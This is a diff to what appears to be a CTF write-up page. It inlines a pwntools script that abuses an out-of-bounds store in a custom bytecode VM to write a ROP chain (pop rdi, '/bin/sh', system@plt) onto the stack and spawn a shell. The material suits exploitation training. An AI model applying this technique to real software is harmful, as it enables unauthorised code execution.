@@ -78,4 +78,62 @@ STR [266], R0       # Write to stack
 Here is the final solution:
 
 ```python
---8<-- "/docs/cyberedu/pwn/virtual/exploit.py"
+from pwn import *
+
+filename = 'exploit.bin'
+
+POP_RDI     = 0x4012fa      # pop rdi ; ret
+BIN_SH      = 0x40207e      # Address of "/bin/sh"
+SYSTEM_PLT  = 0x401184      # Address of system@plt
+RET_GADGET  = 0x40101a      # Your found ret gadget
+
+OFFSET_IDX  = 265
+
+OP_MOV = 0x00
+OP_STR = 0x02
+
+bytecode = b""
+
+def emit_mov(reg_idx, val_32):
+    global bytecode
+    bytecode += p8(OP_MOV)
+    bytecode += p8(reg_idx)
+    bytecode += p32(val_32)
+
+def emit_str(mem_idx, reg_idx):
+    global bytecode
+    bytecode += p8(OP_STR)
+    bytecode += p32(mem_idx)
+    bytecode += p8(reg_idx)
+
+def write_addr_to_stack(start_index, address):
+    low_32  = address & 0xFFFFFFFF
+    high_32 = (address >> 32) & 0xFFFFFFFF
+
+    emit_mov(0, low_32)         # Reg[0] = low_32
+    emit_str(start_index, 0)    # Memory[idx] = Reg[0]
+
+    emit_mov(0, high_32)        # Reg[0] = high_32 (0)
+    emit_str(start_index + 1, 0)# Memory[idx+1] = Reg[0]
+
+idx = OFFSET_IDX
+
+write_addr_to_stack(idx, POP_RDI)
+idx += 2
+
+write_addr_to_stack(idx, BIN_SH)
+idx += 2
+
+write_addr_to_stack(idx, RET_GADGET)
+idx += 2
+
+write_addr_to_stack(idx, SYSTEM_PLT)
+idx += 2
+
+with open(filename, "wb") as f:
+    f.write(bytecode)
+
+print(f"[+] Fixed bytecode generated: {len(bytecode)} bytes")
+print(f"[+] The 'Invalid opcode 32' error should be gone.")
+print(f"[+] Run: ./virtual {filename} CTF{{test}}")
+```
